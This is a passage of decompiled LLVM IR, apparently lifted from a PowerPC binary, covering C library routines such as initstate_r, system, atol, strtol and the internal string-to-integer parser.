  %v0_100064b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100064b0 = add i32 %v0_100064b0, -1
  store i32 %v1_100064b0, i32* %ctr.global-to-local, align 4
  %v2_100064b0 = icmp eq i32 %v1_100064b0, 0
  br i1 %v2_100064b0, label %dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge, label %dec_label_pc_100064ac.dec_label_pc_1000648c_crit_edge

dec_label_pc_100064ac.dec_label_pc_1000648c_crit_edge: ; preds = %dec_label_pc_100064ac
  %v1_1000648c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000648c

dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge: ; preds = %dec_label_pc_100064ac
  %v0_100064b4.pre = load i32, i32* @r30, align 4
  %v0_100064b8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_100064bc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100064b4

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064b0.preheader.thread, %dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge, %dec_label_pc_100064b0.preheader
  %v0_100064bc = phi i32 [ %v0_100064bc.pre, %dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge ], [ %v0_10006470, %dec_label_pc_100064b0.preheader ], [ %v0_10006470, %dec_label_pc_100064b0.preheader.thread ]
  %v0_100064b8 = phi i32 [ %v0_100064b8.pre, %dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge ], [ %v3_1000645c, %dec_label_pc_100064b0.preheader ], [ %v3_1000645c, %dec_label_pc_100064b0.preheader.thread ]
  %v1_100064bc = phi i32 [ %v0_100064b4.pre, %dec_label_pc_100064b0.dec_label_pc_100064b4_crit_edge ], [ %v0_1000645c, %dec_label_pc_100064b0.preheader ], [ %v0_1000645c, %dec_label_pc_100064b0.preheader.thread ]
  %v1_100064b4 = add i32 %v1_100064bc, 20
  %v2_100064b4 = inttoptr i32 %v1_100064b4 to i32*
  %v3_100064b4 = load i32, i32* %v2_100064b4, align 4
  store i32 %v3_100064b4, i32* %r0.global-to-local, align 4
  %v1_100064b8 = mul i32 %v0_100064b8, 10
  store i32 %v1_100064b8, i32* %r31.global-to-local, align 4
  %v2_100064bc = add i32 %v1_100064bc, 4
  %v3_100064bc = inttoptr i32 %v2_100064bc to i32*
  store i32 %v0_100064bc, i32* %v3_100064bc, align 4
  %v0_100064c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100064c0 = mul i32 %v0_100064c0, 4
  %v0_100064c4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100064c4 = add i32 %v0_100064c4, %v1_100064c0
  store i32 %v2_100064c4, i32* %r0.global-to-local, align 4
  %v1_100064c8 = load i32, i32* @r30, align 4
  %v2_100064c8 = inttoptr i32 %v1_100064c8 to i32*
  store i32 %v2_100064c4, i32* %v2_100064c8, align 4
  %v2_100064dc = ptrtoint i32* %stack_var_-24 to i32
  %v0_100064d421 = load i32, i32* %r31.global-to-local, align 4
  %v1_100064d422 = add i32 %v0_100064d421, -1
  store i32 %v1_100064d422, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_100064d422, -1
  br i1 %tmp2025, label %dec_label_pc_100064d0, label %dec_label_pc_100064e4

dec_label_pc_100064d0:                            ; preds = %dec_label_pc_100064b4, %dec_label_pc_100064d0
  %v0_100064d826 = load i32, i32* @r30, align 4
  %v2_100064d0 = inttoptr i32 %v0_100064d826 to i32*
  %v3_100064d0 = call i32 @__GI_random_r(i32* %v2_100064d0, i32 %v2_100064dc)
  %v0_100064d4 = load i32, i32* @r31, align 4
  %v1_100064d4 = add i32 %v0_100064d4, -1
  store i32 %v1_100064d4, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_100064d4, -1
  br i1 %tmp20, label %dec_label_pc_100064d0, label %dec_label_pc_100064e4

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_100064b4, %dec_label_pc_100064d0, %dec_label_pc_10006450
  br label %dec_label_pc_100064e8

dec_label_pc_100064e8:                            ; preds = %entry, %dec_label_pc_100064e4
  %v0_100064ec = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_100064e4 ]
  store i32 %v0_10006420, i32* %r0.global-to-local, align 4
  ret i32 %v0_100064ec

; uselistorder directives
  uselistorder i32 %v1_100064b0, { 1, 0 }
  uselistorder i32 %v2_100064ac, { 1, 0 }
  uselistorder i32 %v2_100064a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000648c, { 1, 0 }
  uselistorder i32 %v0_10006470, { 1, 2, 0 }
  uselistorder i32 %v3_1000645c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100064e8, { 1, 0 }
  uselistorder label %dec_label_pc_100064e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100064d0, { 1, 0 }
  uselistorder label %dec_label_pc_100064b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100064ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000648c, { 1, 0 }
  uselistorder label %dec_label_pc_10006450, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10006504 = load i32, i32* @lr, align 4
  store i32 %v0_10006504, i32* %r0.global-to-local, align 4
  %v2_10006508 = icmp ugt i32 %arg2, 127
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c8e0.405 to i32), i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10006520 = sub i32 255, %arg2
  %v2_10006520 = sub i32 -1, %arg2
  %not.v5_10006520 = icmp ugt i32 %v1_10006520, %v2_10006520
  %v6_10006524 = sext i1 %not.v5_10006520 to i32
  %v1_10006528 = add i32 %tmp, 4
  store i32 %v1_10006528, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10006538 = sub nsw i32 3, %v6_10006524
  store i32 %v1_10006538, i32* @r31, align 4
  br i1 %v2_10006508, label %dec_label_pc_10006560, label %dec_label_pc_10006540

dec_label_pc_10006540:                            ; preds = %entry
  %v2_10006514 = icmp ugt i32 %arg2, 31
  %v1_10006540 = sub i32 63, %arg2
  %not.v5_10006540 = icmp ugt i32 %v1_10006540, %v2_10006520
  %v6_10006544 = sext i1 %not.v5_10006540 to i32
  %v1_1000654c = sub nsw i32 1, %v6_10006544
  store i32 %v1_1000654c, i32* @r31, align 4
  br i1 %v2_10006514, label %dec_label_pc_10006560, label %dec_label_pc_10006554

dec_label_pc_10006554:                            ; preds = %dec_label_pc_10006540
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp6 = icmp ult i32 %arg2, 8
  br i1 %tmp6, label %dec_label_pc_100065c0, label %dec_label_pc_10006560

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006554, %dec_label_pc_10006540, %entry
  %v0_10006560 = phi i32 [ 0, %dec_label_pc_10006554 ], [ %v1_1000654c, %dec_label_pc_10006540 ], [ %v1_10006538, %entry ]
  %v1_10006560 = mul nsw i32 %v0_10006560, 4
  store i32 %v1_10006560, i32* %r0.global-to-local, align 4
  %v2_10006564 = add i32 %arg3, 12
  %v3_10006564 = inttoptr i32 %v2_10006564 to i32*
  store i32 %v0_10006560, i32* %v3_10006564, align 4
  %v0_10006568 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006568 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006568 = add i32 %v1_10006568, %v0_10006568
  store i32 %v2_10006568, i32* %r9.global-to-local, align 4
  %v3_1000656c = inttoptr i32 %v2_10006568 to i32*
  %v4_1000656c = load i32, i32* %v3_1000656c, align 4
  store i32 %v4_1000656c, i32* %r0.global-to-local, align 4
  %v1_10006570 = add i32 %v2_10006568, 20
  %v2_10006570 = inttoptr i32 %v1_10006570 to i32*
  %v3_10006570 = load i32, i32* %v2_10006570, align 4
  store i32 %v3_10006570, i32* %r9.global-to-local, align 4
  %v0_10006574 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006574 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006574 = add i32 %v1_10006574, 8
  %v3_10006574 = inttoptr i32 %v2_10006574 to i32*
  store i32 %v0_10006574, i32* %v3_10006574, align 4
  %v0_10006578 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006578 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006578 = add i32 %v1_10006578, 20
  %v3_10006578 = inttoptr i32 %v2_10006578 to i32*
  store i32 %v0_10006578, i32* %v3_10006578, align 4
  %v0_1000657c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000657c = mul i32 %v0_1000657c, 4
  store i32 %v1_1000657c, i32* %r0.global-to-local, align 4
  %v1_10006580 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006580 = add i32 %v1_10006580, 16
  %v3_10006580 = inttoptr i32 %v2_10006580 to i32*
  store i32 %v0_1000657c, i32* %v3_10006580, align 4
  %v0_10006584 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006584 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006584 = add i32 %v1_10006584, %v0_10006584
  store i32 %v2_10006584, i32* %r0.global-to-local, align 4
  %v1_10006588 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006588 = add i32 %v1_10006588, 24
  %v3_10006588 = inttoptr i32 %v2_10006588 to i32*
  store i32 %v2_10006584, i32* %v3_10006588, align 4
  store i32 ptrtoint (i32* @global_var_10006590.407 to i32), i32* @lr, align 4
  %v0_1000658c = call i32 @srandom_r()
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10006594 = load i32, i32* @r31, align 4
  %v3_10006594 = icmp eq i32 %v0_10006594, 0
  %v1_10006598 = load i32, i32* %r27.global-to-local, align 4
  %v2_10006598 = inttoptr i32 %v1_10006598 to i32*
  store i32 0, i32* %v2_10006598, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10006594, label %dec_label_pc_100065d4, label %dec_label_pc_100065a4

dec_label_pc_100065a4:                            ; preds = %dec_label_pc_10006560
  %v0_100065a4 = load i32, i32* @r30, align 4
  %v1_100065a4 = add i32 %v0_100065a4, 4
  %v2_100065a4 = inttoptr i32 %v1_100065a4 to i32*
  %v3_100065a4 = load i32, i32* %v2_100065a4, align 4
  %v0_100065a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100065a8 = sub i32 %v3_100065a4, %v0_100065a8
  %v4_100065ac = sdiv i32 %v2_100065a8, 4
  %v1_100065b0 = mul i32 %v4_100065ac, 5
  %v1_100065b4 = load i32, i32* @r31, align 4
  %v2_100065b4 = add i32 %v1_100065b0, %v1_100065b4
  store i32 %v2_100065b4, i32* %r0.global-to-local, align 4
  %v1_100065b8 = load i32, i32* %r27.global-to-local, align 4
  %v2_100065b8 = inttoptr i32 %v1_100065b8 to i32*
  store i32 %v2_100065b4, i32* %v2_100065b8, align 4
  %v0_100065e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100065d4

dec_label_pc_100065c0:                            ; preds = %dec_label_pc_10006554
  %v0_100065c0 = call i32 @__errno_location()
  store i32 %v0_100065c0, i32* %r3.global-to-local, align 4
  %v0_100065c4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100065c4 = inttoptr i32 %v0_100065c0 to i32*
  store i32 %v0_100065c4, i32* %v2_100065c4, align 4
  %v0_100065c8 = call i32 @__errno_location()
  %v0_100065cc = load i32, i32* %r28.global-to-local, align 4
  %v2_100065cc = inttoptr i32 %v0_100065c8 to i32*
  store i32 %v0_100065cc, i32* %v2_100065cc, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100065d4

dec_label_pc_100065d4:                            ; preds = %dec_label_pc_10006560, %dec_label_pc_100065a4, %dec_label_pc_100065c0
  %v0_100065e4 = phi i32 [ 0, %dec_label_pc_10006560 ], [ %v0_100065e4.pre, %dec_label_pc_100065a4 ], [ -1, %dec_label_pc_100065c0 ]
  store i32 %v0_10006504, i32* %r0.global-to-local, align 4
  ret i32 %v0_100065e4

; uselistorder directives
  uselistorder i32 %v0_1000657c, { 1, 0 }
  uselistorder i32 %v2_10006568, { 1, 0, 2 }
  uselistorder i32 %v0_10006560, { 1, 0 }
  uselistorder i32 %v2_10006520, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000c8e0.405 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 4, 5, 0, 2, 3 }
  uselistorder label %dec_label_pc_100065d4, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_100065f4 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_100065f8 = load i32, i32* @r31, align 4
  br i1 %v3_100065f4, label %dec_label_pc_10006728, label %dec_label_pc_10006608

dec_label_pc_10006608:                            ; preds = %entry
  store i32 268461588, i32* @lr, align 4
  %v2_10006610 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268461604, i32* @lr, align 4
  %v2_10006620 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268461620, i32* @lr, align 4
  %v2_10006630 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_10006630, i32* @r3, align 4
  store i32 268461628, i32* @lr, align 4
  %v1_10006638 = call i32 @__vfork(i32 %v2_10006630)
  store i32 %v1_10006638, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_10006638, -1
  br i1 %tmp10, label %dec_label_pc_10006670, label %dec_label_pc_10006644

dec_label_pc_10006644:                            ; preds = %dec_label_pc_10006608
  store i32 268461648, i32* @lr, align 4
  %v2_1000664c = call i32 @__bsd_signal(i32 3, i32 %v2_10006610)
  store i32 268461660, i32* @lr, align 4
  %v2_10006658 = call i32 @__bsd_signal(i32 2, i32 %v2_10006620)
  store i32 268461672, i32* @lr, align 4
  %v2_10006664 = call i32 @__bsd_signal(i32 17, i32 %v2_10006630)
  br label %dec_label_pc_10006728

dec_label_pc_10006670:                            ; preds = %dec_label_pc_10006608
  %v3_1000663c = icmp eq i32 %v1_10006638, 0
  br i1 %v3_1000663c, label %dec_label_pc_10006674, label %dec_label_pc_100066c8

dec_label_pc_10006674:                            ; preds = %dec_label_pc_10006670
  store i32 268461696, i32* @lr, align 4
  %v2_1000667c = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268461708, i32* @lr, align 4
  %v2_10006688 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268461720, i32* @lr, align 4
  %v2_10006694 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_100066bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1000c908.408 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000c910.409 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000c914.410 to i32), i32 %arg1, i32 0)
  %v1_100066c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100066c8

dec_label_pc_100066c8:                            ; preds = %dec_label_pc_10006670, %dec_label_pc_10006674
  store i32 268461780, i32* @lr, align 4
  %v2_100066d0 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268461792, i32* @lr, align 4
  %v2_100066dc = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_100066e0 = load i32, i32* @r31, align 4
  store i32 268461812, i32* @lr, align 4
  %v4_100066f0 = call i32 @wait4(i32 %v0_100066e0)
  %v3_100066f4 = icmp eq i32 %v4_100066f0, -1
  br i1 %v3_100066f4, label %dec_label_pc_100066fc, label %dec_label_pc_10006700

dec_label_pc_100066fc:                            ; preds = %dec_label_pc_100066c8
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10006700

dec_label_pc_10006700:                            ; preds = %dec_label_pc_100066c8, %dec_label_pc_100066fc
  store i32 268461836, i32* @lr, align 4
  %v2_10006708 = call i32 @__bsd_signal(i32 3, i32 %v2_10006610)
  store i32 268461848, i32* @lr, align 4
  %v2_10006714 = call i32 @__bsd_signal(i32 2, i32 %v2_10006620)
  store i32 268461860, i32* @lr, align 4
  %v2_10006720 = call i32 @__bsd_signal(i32 17, i32 %v2_10006630)
  %v3_10006724 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10006728

dec_label_pc_10006728:                            ; preds = %entry, %dec_label_pc_10006644, %dec_label_pc_10006700
  %v0_10006738 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_10006644 ], [ %v3_10006724, %dec_label_pc_10006700 ]
  store i32 %v0_100065f8, i32* @r31, align 4
  ret i32 %v0_10006738

; uselistorder directives
  uselistorder i32 %v1_10006638, { 1, 0, 2 }
  uselistorder i32 %v2_10006630, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10006620, { 1, 0 }
  uselistorder i32 %v2_10006610, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006728, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006700, { 1, 0 }
  uselistorder label %dec_label_pc_100066c8, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_10006744 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_10006744
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000674c = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000674c
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10006760 = load i32, i32* @r4, align 4
  store i32 %v0_10006760, i32* %r25.global-to-local, align 4
  %v0_10006768 = load i32, i32* @r5, align 4
  store i32 %v0_10006768, i32* %r30.global-to-local, align 4
  %v0_1000676c = load i32, i32* @r6, align 4
  store i32 %v0_1000676c, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10006774 = load i32, i32* @global_var_1001d818, align 4
  store i32 %v3_10006774, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006780

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_10006780
  %v1_1000677c = add i32 %v0_100067b4, 1
  store i32 %v1_1000677c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006780

dec_label_pc_10006780:                            ; preds = %entry, %dec_label_pc_1000677c
  %v0_100067b4 = phi i32 [ %tmp, %entry ], [ %v1_1000677c, %dec_label_pc_1000677c ]
  %v1_10006780 = inttoptr i32 %v0_100067b4 to i8*
  %v2_10006780 = load i8, i8* %v1_10006780, align 1
  %v3_10006780 = zext i8 %v2_10006780 to i32
  %v1_10006784 = mul nuw nsw i32 %v3_10006780, 2
  %v2_10006788 = add i32 %v1_10006784, %v3_10006774
  %v3_10006788 = inttoptr i32 %v2_10006788 to i16*
  %v4_10006788 = load i16, i16* %v3_10006788, align 2
  %v1_1000678c = and i16 %v4_10006788, 32
  %v3_1000678c = icmp eq i16 %v1_1000678c, 0
  br i1 %v3_1000678c, label %dec_label_pc_10006794, label %dec_label_pc_1000677c

dec_label_pc_10006794:                            ; preds = %dec_label_pc_10006780
  %v3_10006794 = icmp eq i8 %v2_10006780, 43
  br i1 %v3_10006794, label %dec_label_pc_100067b4, label %dec_label_pc_1000679c

dec_label_pc_1000679c:                            ; preds = %dec_label_pc_10006794
  %v3_1000679c = icmp eq i8 %v2_10006780, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_1000679c, label %dec_label_pc_100067b4, label %dec_label_pc_100067b8

dec_label_pc_100067b4:                            ; preds = %dec_label_pc_10006794, %dec_label_pc_1000679c
  %storemerge = phi i32 [ 1, %dec_label_pc_1000679c ], [ 0, %dec_label_pc_10006794 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_100067b4 = add i32 %v0_100067b4, 1
  store i32 %v1_100067b4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100067b8

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_1000679c, %dec_label_pc_100067b4
  %v1_100067b8 = call i32 @__asm_rlwinm.(i32 %v0_10006768, i32 0, i32 28, i32 26)
  %v4_100067b8 = icmp eq i32 %v1_100067b8, 0
  br i1 %v4_100067b8, label %dec_label_pc_100067c4, label %dec_label_pc_100067b8.dec_label_pc_10006800_crit_edge

dec_label_pc_100067b8.dec_label_pc_10006800_crit_edge: ; preds = %dec_label_pc_100067b8
  %v0_10006800.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006800

dec_label_pc_100067c4:                            ; preds = %dec_label_pc_100067b8
  %v0_100067c4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100067c4 = inttoptr i32 %v0_100067c4 to i8*
  %v2_100067c4 = load i8, i8* %v1_100067c4, align 1
  %v0_100067c8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100067c8 = add i32 %v0_100067c8, 10
  store i32 %v1_100067c8, i32* %r30.global-to-local, align 4
  %v3_100067cc = icmp eq i8 %v2_100067c4, 48
  br i1 %v3_100067cc, label %dec_label_pc_100067d4, label %dec_label_pc_100067f4

dec_label_pc_100067d4:                            ; preds = %dec_label_pc_100067c4
  %v1_100067d4 = add i32 %v0_100067c4, 1
  %v2_100067d4 = inttoptr i32 %v1_100067d4 to i8*
  %v3_100067d4 = load i8, i8* %v2_100067d4, align 1
  %v4_100067d4 = zext i8 %v3_100067d4 to i32
  store i32 %v1_100067d4, i32* %r31.global-to-local, align 4
  %v1_100067d8 = add i32 %v0_100067c8, 8
  store i32 %v1_100067d8, i32* %r30.global-to-local, align 4
  %v1_100067dc = or i32 %v4_100067d4, 32
  %v3_100067e4 = icmp eq i32 %v1_100067dc, 120
  br i1 %v3_100067e4, label %dec_label_pc_100067ec, label %dec_label_pc_100067f4

dec_label_pc_100067ec:                            ; preds = %dec_label_pc_100067d4
  %v1_100067ec = mul i32 %v1_100067d8, 2
  store i32 %v1_100067ec, i32* %r30.global-to-local, align 4
  %v1_100067f0 = add i32 %v0_100067c4, 2
  store i32 %v1_100067f0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100067f4

dec_label_pc_100067f4:                            ; preds = %dec_label_pc_100067d4, %dec_label_pc_100067c4, %dec_label_pc_100067ec
  %v0_100068a815 = phi i32 [ %v1_100067d4, %dec_label_pc_100067ec ], [ %tmp, %dec_label_pc_100067c4 ], [ %v1_100067d4, %dec_label_pc_100067d4 ]
  %v0_100067f4 = phi i32 [ %v1_100067ec, %dec_label_pc_100067ec ], [ %v1_100067c8, %dec_label_pc_100067c4 ], [ %v1_100067d8, %dec_label_pc_100067d4 ]
  %tmp22 = icmp slt i32 %v0_100067f4, 17
  br i1 %tmp22, label %dec_label_pc_10006800, label %dec_label_pc_100067fc

dec_label_pc_100067fc:                            ; preds = %dec_label_pc_100067f4
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006800

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067b8.dec_label_pc_10006800_crit_edge, %dec_label_pc_100067f4, %dec_label_pc_100067fc
  %v0_100068a814 = phi i32 [ %tmp, %dec_label_pc_100067b8.dec_label_pc_10006800_crit_edge ], [ %v0_100068a815, %dec_label_pc_100067f4 ], [ %v0_100068a815, %dec_label_pc_100067fc ]
  %v1_10006814 = phi i32 [ %v0_10006800.pre, %dec_label_pc_100067b8.dec_label_pc_10006800_crit_edge ], [ %v0_100067f4, %dec_label_pc_100067f4 ], [ 16, %dec_label_pc_100067fc ]
  %v1_10006800 = add i32 %v1_10006814, -2
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10006808 = icmp ugt i32 %v1_10006800, 34
  br i1 %v2_10006808, label %dec_label_pc_100068a0, label %dec_label_pc_10006810

dec_label_pc_10006810:                            ; preds = %dec_label_pc_10006800
  %v2_10006814 = udiv i32 -1, %v1_10006814
  store i32 %v2_10006814, i32* %r29.global-to-local, align 4
  %v2_10006818 = mul i32 %v2_10006814, %v1_10006814
  %v1_1000681c = sub i32 -1, %v2_10006818
  %v1_10006820 = urem i32 %v1_1000681c, 256
  store i32 %v1_10006820, i32* %r27.global-to-local, align 4
  %v0_1000682c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000682c

dec_label_pc_10006828:                            ; preds = %dec_label_pc_10006898, %dec_label_pc_10006880
  %v1_10006830.pre = phi i32 [ %v1_10006830, %dec_label_pc_10006898 ], [ %v1_10006830.pre.pre, %dec_label_pc_10006880 ]
  %v0_10006830.pre = phi i32 [ %v2_10006898, %dec_label_pc_10006898 ], [ %v0_10006830.pre.pre, %dec_label_pc_10006880 ]
  %v0_10006828 = phi i32 [ %v1_10006864, %dec_label_pc_10006898 ], [ %v0_10006828.pre, %dec_label_pc_10006880 ]
  br label %dec_label_pc_1000682c

dec_label_pc_1000682c:                            ; preds = %dec_label_pc_10006810, %dec_label_pc_10006828
  %v0_100068a812 = phi i32 [ %v0_100068a814, %dec_label_pc_10006810 ], [ %v0_10006828, %dec_label_pc_10006828 ]
  %v0_10006864 = phi i32 [ %v0_1000682c.pre, %dec_label_pc_10006810 ], [ %v0_10006828, %dec_label_pc_10006828 ]
  %v1_10006830 = phi i32 [ %v2_10006814, %dec_label_pc_10006810 ], [ %v1_10006830.pre, %dec_label_pc_10006828 ]
  %v0_10006870 = phi i32 [ 0, %dec_label_pc_10006810 ], [ %v0_10006830.pre, %dec_label_pc_10006828 ]
  %v1_1000682c = inttoptr i32 %v0_10006864 to i8*
  %v2_1000682c = load i8, i8* %v1_1000682c, align 1
  %v3_1000682c = zext i8 %v2_1000682c to i32
  %v3_10006830 = icmp ugt i32 %v0_10006870, %v1_10006830
  %v1_10006838 = add nuw nsw i32 %v3_1000682c, 208
  %v1_1000683c = or i32 %v3_1000682c, 32
  %v1_10006840 = urem i32 %v1_10006838, 256
  %tmp23 = icmp ult i32 %v1_10006840, 10
  br i1 %tmp23, label %dec_label_pc_10006860, label %dec_label_pc_10006850

dec_label_pc_10006850:                            ; preds = %dec_label_pc_1000682c
  %tmp24 = icmp ult i32 %v1_1000683c, 97
  br i1 %tmp24, label %dec_label_pc_10006860, label %dec_label_pc_1000685c

dec_label_pc_1000685c:                            ; preds = %dec_label_pc_10006850
  %v1_10006850 = add nsw i32 %v1_1000683c, -87
  %v1_1000685c = urem i32 %v1_10006850, 256
  br label %dec_label_pc_10006860

dec_label_pc_10006860:                            ; preds = %dec_label_pc_10006850, %dec_label_pc_1000682c, %dec_label_pc_1000685c
  %v1_10006898 = phi i32 [ 40, %dec_label_pc_10006850 ], [ %v1_10006840, %dec_label_pc_1000682c ], [ %v1_1000685c, %dec_label_pc_1000685c ]
  %v1_10006860 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006860 = icmp slt i32 %v1_10006898, %v1_10006860
  %v1_10006864 = add i32 %v0_10006864, 1
  store i32 %v1_10006864, i32* %r31.global-to-local, align 4
  br i1 %v2_10006860, label %dec_label_pc_1000686c, label %dec_label_pc_100068a0

dec_label_pc_1000686c:                            ; preds = %dec_label_pc_10006860
  br i1 %v3_10006830, label %dec_label_pc_10006880, label %dec_label_pc_10006870

dec_label_pc_10006870:                            ; preds = %dec_label_pc_1000686c
  %v1_10006874 = load i32, i32* %r27.global-to-local, align 4
  %v0_10006878.not = icmp ne i32 %v0_10006870, %v1_10006830
  %tmp25 = icmp ule i32 %v1_10006898, %v1_10006874
  %or.cond = or i1 %tmp25, %v0_10006878.not
  br i1 %or.cond, label %dec_label_pc_10006898, label %dec_label_pc_10006880

dec_label_pc_10006880:                            ; preds = %dec_label_pc_10006870, %dec_label_pc_1000686c
  %v0_10006880 = call i32 @__errno_location()
  %v0_10006884 = load i32, i32* %r28.global-to-local, align 4
  %v1_10006884 = load i32, i32* %r26.global-to-local, align 4
  %v2_10006884 = and i32 %v1_10006884, %v0_10006884
  store i32 %v2_10006884, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  %v2_10006890 = inttoptr i32 %v0_10006880 to i32*
  store i32 34, i32* %v2_10006890, align 4
  %v0_10006828.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006830.pre.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10006830.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006828

